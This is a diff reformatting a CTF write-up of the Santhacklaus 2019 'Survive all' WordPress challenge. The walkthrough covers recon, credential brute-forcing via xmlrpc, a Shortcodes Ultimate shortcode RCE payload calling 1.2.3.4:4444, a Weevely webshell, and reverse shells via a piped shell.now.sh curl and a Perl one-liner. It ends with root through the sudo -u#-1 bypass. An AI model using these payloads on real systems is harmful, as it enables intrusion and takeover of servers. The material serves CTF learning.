@@ -11,19 +11,19 @@ Survive all was a challenge proposed during the Santhacklaus CTF 2019. It was on
 
 ![](/img/santhacklaus-2019/screen-0.png)
 
-## Step 1 : Perimeter discovery
+# Step 1 : Perimeter discovery
 
-### 1.1. Services
+## 1.1. Services
 
 We started this challenge with a classical services recon.
 
 ```md
-PORT   STATE  SERVICE VERSION
+PORT STATE SERVICE VERSION
 22/tcp closed ssh
-80/tcp open   http    Apache httpd 2.4.38
-| http-methods: 
-|_  Supported Methods: HEAD
-|_http-title: Survive All The best survival tech guide
+80/tcp open http Apache httpd 2.4.38
+| http-methods:
+|\_ Supported Methods: HEAD
+|\_http-title: Survive All The best survival tech guide
 Service Info: Host: 172.20.0.3
 ```
 
@@ -34,7 +34,7 @@ Service Info: Host: 172.20.0.3
 
 No UDP ports have been detected.
 
-### 1.2. Web scanning
+## 1.2. Web scanning
 
 The first step on the web application was to discover the technology used by the application. In this case, the browser extension Wappalyser give us somes informations. The application seem to be a Worpress running in 5.2.4 version with a WooCommerce plugin.
 
@@ -42,40 +42,38 @@ The first step on the web application was to discover the technology used by the
 
 {{< warning "Wappalyser is a usefull extension. Nevertheless, the extension send anonymous report with your analysed contents. Be carefull ! You can easily disable this feature under extension menu." >}}
 
-
 ![](/img/santhacklaus-2019/wappalyzer.png)
-
 
 It's possible to obtain many informations with the public tool **Wpscan**.
 
 ```md
 [+] http://survive-all.santhacklaus.xyz/
- | Interesting Entries:
- |  - Server: Apache/2.4.38 (Debian)
- |  - X-Powered-By: PHP/7.3.12
- |
+| Interesting Entries:
+| - Server: Apache/2.4.38 (Debian)
+| - X-Powered-By: PHP/7.3.12
+|
 [+] http://survive-all.santhacklaus.xyz/xmlrpc.php
- |
+|
 [+] http://survive-all.santhacklaus.xyz/readme.html
- |
+|
 [+] http://survive-all.santhacklaus.xyz/wp-cron.php
- |
+|
 [+] woocommerce
- | Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/woocommerce/
- | Last Updated: 2019-11-27T19:11:00.000Z
- | [!] The version is out of date, the latest version is 3.8.1
- | Version: 3.3.0 (100% confidence)
- |
+| Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/woocommerce/
+| Last Updated: 2019-11-27T19:11:00.000Z
+| [!] The version is out of date, the latest version is 3.8.1
+| Version: 3.3.0 (100% confidence)
+|
 [+] WordPress version 5.2.4 identified (Latest, released on 2019-10-14).
- | Found By: Rss Generator (Passive Detection) (http://survive-all.santhacklaus.xyz/?feed=rss2)
- |
+| Found By: Rss Generator (Passive Detection) (http://survive-all.santhacklaus.xyz/?feed=rss2)
+|
 [+] WordPress theme in use: hestia
- | Readme: http://survive-all.santhacklaus.xyz/wp-content/themes/hestia/readme.txt
- | [!] The version is out of date, the latest version is 2.5.5
- | Version: 2.5.4
- |
+| Readme: http://survive-all.santhacklaus.xyz/wp-content/themes/hestia/readme.txt
+| [!] The version is out of date, the latest version is 2.5.5
+| Version: 2.5.4
+|
 [i] User(s) Identified:
- |
+|
 [+] admin
 [+] Gear Brills
 [+] dike
@@ -95,42 +93,41 @@ Severals informations have been revealed by the scanner :
 - Rss feed is present.
 - Several users was found.
 - File upload vulnerability affects this woocommerce plugin version but seem unexploitable :
-    - https://www.pluginvulnerabilities.com/2017/04/20/arbitrary-file-upload-vulnerability-in-woocommerce-catalog-enquiry/
-    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-woocommerce-catalog-enquiry-arbitrary-file-upload-3-0-0/
+  - https://www.pluginvulnerabilities.com/2017/04/20/arbitrary-file-upload-vulnerability-in-woocommerce-catalog-enquiry/
+  - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-woocommerce-catalog-enquiry-arbitrary-file-upload-3-0-0/
 
 {{< protips "Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version." >}}
 
-### 1.3. Plugins bruteforcing
+## 1.3. Plugins bruteforcing
 
 During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlist to obtained more plugins : http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt
-
 
 ```bash
 [th1b4ud@th1b4ud-pc ~]$ ./wfuzz -w ~/dictionaries/wp-plugins.txt --hc 404 http://survive-all.santhacklaus.xyz/wp-content/plugins/FUZZ
 
 ===================================================================
-ID           Response   Lines    Word     Chars       Payload                                            
+ID           Response   Lines    Word     Chars       Payload
 ===================================================================
 
-000000071:   403        9 L      28 W     293 Ch      "akismet"                                          
-000000564:   301        9 L      28 W     389 Ch      "import-users-from-csv-with-meta"                  
-000000587:   301        9 L      28 W     365 Ch      "jetpack"                                          
-000000654:   301        9 L      28 W     383 Ch      "mailchimp-for-woocommerce"                        
-000000667:   301        9 L      28 W     371 Ch      "master-slider"                                    
-000000701:   301        9 L      28 W     367 Ch      "ml-slider"                                        
-000000944:   301        9 L      28 W     377 Ch      "shortcodes-ultimate"                              
-000001003:   301        9 L      28 W     372 Ch      "smart-slider-3"                                   
-000001093:   301        9 L      28 W     377 Ch      "themeisle-companion"                              
-000001095:   301        9 L      28 W     372 Ch      "theme-my-login"                                   
-000001216:   301        9 L      28 W     369 Ch      "woocommerce"                                      
-000001252:   301        9 L      28 W     378 Ch      "woocommerce-services"                             
-000001328:   301        9 L      28 W     370 Ch      "wpforms-lite"                                     
-000001406:   301        9 L      28 W     369 Ch      "wp-rollback"                                      
+000000071:   403        9 L      28 W     293 Ch      "akismet"
+000000564:   301        9 L      28 W     389 Ch      "import-users-from-csv-with-meta"
+000000587:   301        9 L      28 W     365 Ch      "jetpack"
+000000654:   301        9 L      28 W     383 Ch      "mailchimp-for-woocommerce"
+000000667:   301        9 L      28 W     371 Ch      "master-slider"
+000000701:   301        9 L      28 W     367 Ch      "ml-slider"
+000000944:   301        9 L      28 W     377 Ch      "shortcodes-ultimate"
+000001003:   301        9 L      28 W     372 Ch      "smart-slider-3"
+000001093:   301        9 L      28 W     377 Ch      "themeisle-companion"
+000001095:   301        9 L      28 W     372 Ch      "theme-my-login"
+000001216:   301        9 L      28 W     369 Ch      "woocommerce"
+000001252:   301        9 L      28 W     378 Ch      "woocommerce-services"
+000001328:   301        9 L      28 W     370 Ch      "wpforms-lite"
+000001406:   301        9 L      28 W     369 Ch      "wp-rollback"
 ```
 
 Great ! It's better. Theses plugins have been checked later.
 
-### 1.4. Account informations gathering
+## 1.4. Account informations gathering
 
 A page on the application indicated somes usernames.
 
@@ -139,13 +136,12 @@ A page on the application indicated somes usernames.
 A other page indicated that partner of survive-all are _cuttingedge_ and _flyingeagle_ company. The page also gave us an email format (for account bruteforce ?).
 
 ```md
-For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform 
+For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform
 ```
 
 ![](/img/santhacklaus-2019/screen-5.png)
 
-
-### 1.5. Default password
+## 1.5. Default password
 
 A page leaked informations about user credentials. Apparently, user password have the specific format : `@@MonthYear@@`
 
@@ -153,12 +149,9 @@ A page leaked informations about user credentials. Apparently, user password hav
 
 http://survive-all.santhacklaus.xyz/?p=142
 
+# Step 2 : Account compromission
 
-
-
-## Step 2 : Account compromission
-
-### 2.1. Users enumeration
+## 2.1. Users enumeration
 
 Wordpress is vulnerable by default to users enumeration. However, wordpress developers replied that this is not a vulnerability. Let's prove them wrong !
 
@@ -180,8 +173,7 @@ However `admin` account was available.
 
 ![](/img/santhacklaus-2019/screen-3.png)
 
-
-### 2.2. Valid email
+## 2.2. Valid email
 
 With reference to informations previously obtained, we can bruteforce the application to obtain valid email.
 
@@ -203,7 +195,7 @@ s.parker@cuttingedge.com
 j.yestin@cuttingedge.com
 ```
 
-### 2.3. Valid credentials
+## 2.3. Valid credentials
 
 The login form was not protected against bruteforce attack. Then, we have bruteforced password for the emails previously obtained.
 
@@ -230,15 +222,15 @@ This technique permited to found s.parker password.
 {{< protips "If you don't have Burp Pro (humf huge mistake), you can abuse of xmlrpc mechanism to perform massive bruteforce attack with WPScan." >}}
 
 ```md
-[th1b4ud@th1b4ud-pc]$ wpscan --url http://survive-all.santhacklaus.xyz -U "s.parker@cuttingedge.com" -P wordlist-pwd.txt
+[th1b4ud@th1b4ud-pc]\$ wpscan --url http://survive-all.santhacklaus.xyz -U "s.parker@cuttingedge.com" -P wordlist-pwd.txt
 
 [+] Performing password attack on Xmlrpc against 1 user/s
 [SUCCESS] - s.parker@cuttingedge.com / @@January2018@@
-  
+
 Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100.00% Time: 00:00:00
 
 [i] Valid Combinations Found:
- | Username: s.parker@cuttingedge.com, Password: @@January2018@@
+| Username: s.parker@cuttingedge.com, Password: @@January2018@@
 ```
 
 WPScan is really a nice tool !
@@ -249,9 +241,7 @@ Theses credentials permitted to obtain an access as **Steve Parker**. This acces
 
 ![](/img/santhacklaus-2019/screen-11.png)
 
-
-
-## Step 3 : Plugin exploit
+# Step 3 : Plugin exploit
 
 With the previous plugins list obtained with wfuzz, I checked all of them on google and one link appeared really interesting : https://wpvulndb.com/vulnerabilities/8945
 
@@ -261,7 +251,7 @@ The exploit is pretty simple. We tried it on a new article.
 
 ![](/img/santhacklaus-2019/screen-15.png)
 
-Payload : 
+Payload :
 
 ```md
 [su_meta key=1 post_id=1 default='curl http://1.2.3.4:4444/RCE!!!' filter='system']
@@ -271,14 +261,13 @@ Payload :
 
 Perfect ! So beautiful ! The remote server reached our computer. Our commands have been correctly executed.
 
-
-### 3.1. Webshell creation
+## 3.1. Webshell creation
 
 The basic RCE was really unconfortable. So we've created a webshell with **Weevely** !
 
 {{< protips "Weevely is a secured webshell designed for post-exploitation purposes. It's a tool naturally present on offensive distribution. More infos here : https://github.com/epinna/weevely3" >}}
 
-If you haven't develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(
+If you haven't develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s\*\*t !!!) :(
 
 ```bash
 [th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py generate teachunbequatreude_password agent.php
@@ -298,12 +287,12 @@ Done !
 Weevely webshell is really simple to use.
 
 ```md
-[th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password
+[th1b4ud@th1b4ud-pc weevely3]\$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password
 
 [+] Weevely 3.7.0
 
-[+] Target:	survive-all.santhacklaus.xyz
-[+] Session:	/home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
+[+] Target: survive-all.santhacklaus.xyz
+[+] Session: /home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session
 
 [+] Browse the filesystem or execute commands starts the connection
 [+] to the target. Type :help for more information.
@@ -312,40 +301,39 @@ Weevely> id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The power of this tool comes from all its features. On this challenge, normal reverse shell weren't working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : `:backdoor_reversetcp` (yeah I know, this name s**k so much) :'(
+The power of this tool comes from all its features. On this challenge, normal reverse shell weren't working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : `:backdoor_reversetcp` (yeah I know, this name s\*\*k so much) :'(
 
 ![](/img/santhacklaus-2019/screen-16-4-5.png)
 
 Weevely also have a module to enumerates suid/guid binaries to prepare your privilege escalation !
 
 ```md
-www-data@081256f7edc3:/var/www/html/wp-content/uploads $ :audit_suidsgid /
+www-data@081256f7edc3:/var/www/html/wp-content/uploads \$ :audit_suidsgid /
 +---------------------------------------------+
-| /usr/bin/passwd                             |
-| /usr/bin/gpasswd                            |
-| /usr/bin/wall                               |
-| /usr/bin/newgrp                             |
-| /usr/bin/chage                              |
-| /usr/bin/chsh                               |
-| /usr/bin/expiry                             |
-| /usr/bin/chfn                               |
-| /usr/bin/ssh-agent                          |
-| /usr/local/share/fonts                      |
-| /usr/local/bin/sudo                         |
+| /usr/bin/passwd |
+| /usr/bin/gpasswd |
+| /usr/bin/wall |
+| /usr/bin/newgrp |
+| /usr/bin/chage |
+| /usr/bin/chsh |
+| /usr/bin/expiry |
+| /usr/bin/chfn |
+| /usr/bin/ssh-agent |
+| /usr/local/share/fonts |
+| /usr/local/bin/sudo |
 | /usr/lib/dbus-1.0/dbus-daemon-launch-helper |
-| /usr/lib/openssh/ssh-keysign                |
-| /var/mail                                   |
-| /var/local                                  |
-| /bin/su                                     |
-| /bin/umount                                 |
-| /bin/mount                                  |
-| /opt/gather_todos_wrapper                   |
-| /sbin/unix_chkpwd                           |
+| /usr/lib/openssh/ssh-keysign |
+| /var/mail |
+| /var/local |
+| /bin/su |
+| /bin/umount |
+| /bin/mount |
+| /opt/gather_todos_wrapper |
+| /sbin/unix_chkpwd |
 +---------------------------------------------+
 ```
 
-
-### 3.2. Bdd creds
+## 3.2. Bdd creds
 
 With the RCE we was able to easily grab MySQL credentials from `wp-config.php` file.
 
@@ -374,16 +362,15 @@ With the RCE we was able to easily grab MySQL credentials from `wp-config.php` f
 
 Look at this l33t originality :D
 
-### 3.3. Reverse shell
+## 3.3. Reverse shell
 
-With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but  they weren't working. In the end we still managed to get a reverse shell with perl payload.
+With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but they weren't working. In the end we still managed to get a reverse shell with perl payload.
 
 {{< protips "In the objective to optimise your post exploitation time, I advise you to use shell.now.sh, an automated reverse shell tool : https://github.com/lukechilds/reverse-shell" >}}
 
 `shell.now.sh` is a reverse shell provider tool. It's really simple to use : `curl https://shell.now.sh/<IP>:<PORT> | sh`
 
 Final paylod : `http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl https://shell.now.sh/1.2.3.4:4444 | sh`
-
 
 ![](/img/santhacklaus-2019/screen-16-5.png)
 
@@ -393,9 +380,9 @@ If you are curious, here is the original payload :
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"1.2.3.4:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
-## Step 4 : Privilege escalation
+# Step 4 : Privilege escalation
 
-### 4.1. Informations gathering
+## 4.1. Informations gathering
 
 At this, we were in possesion of a RCE with `www-data` user. The final objective of the challenge was to obtains root access.
 
@@ -436,8 +423,7 @@ www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb {} \;
 
 This script permited to guess the account credentials `testaccount:testaccount`
 
-
-### 4.2. Group privilege escalation
+## 4.2. Group privilege escalation
 
 A classical `sudo -l` command permited to find sudo privilege of the `testaccount` user. This account were authorized to execute with `staffteam` group privilege any command.
 
@@ -449,8 +435,7 @@ User testaccount may run the following commands on 6a7280b6ec79:
 
 We opened an other shell with `staffteam` group privilege.
 
-
-### 4.3. SSH activation
+## 4.3. SSH activation
 
 This account with `staffteam` group privilege have the permission to restart SSH service.
 
@@ -468,7 +453,7 @@ www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "echo testaccou
 
 Done !
 
-### 4.4. SSH connexion
+## 4.4. SSH connexion
 
 We dropped our SSH key in `.ssh/authorized_keys` and successfully obtained remote SSH connexion.
 
@@ -502,12 +487,12 @@ individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-testaccount@1788f40d5d0e:~$ 
+testaccount@1788f40d5d0e:~$
 ```
 
 Nice ! TTY shell access !
 
-### 4.5. Root privilege esacalation
+## 4.5. Root privilege esacalation
 
 The privilege `(ALL, !root) ALL` reffered for an early vulnerability end 2019 : https://www.exploit-db.com/exploits/47502. This exploit permited to obtain the final root access on the server.
 
@@ -516,9 +501,9 @@ testaccount@63f5721427e4:~$ sudo -u#-1 /bin/bash
 Password:
 
 root@63f5721427e4:/home/testaccount# id
-uid=0(root) gid=1001(staffteam) groups=1001(staffteam) 
+uid=0(root) gid=1001(staffteam) groups=1001(staffteam)
 
-root@63f5721427e4:/home/testaccount# cat /root/flag.txt 
+root@63f5721427e4:/home/testaccount# cat /root/flag.txt
 SANTA{W3ll_d0ne!!You_HAVE_w0n}
 ```
 
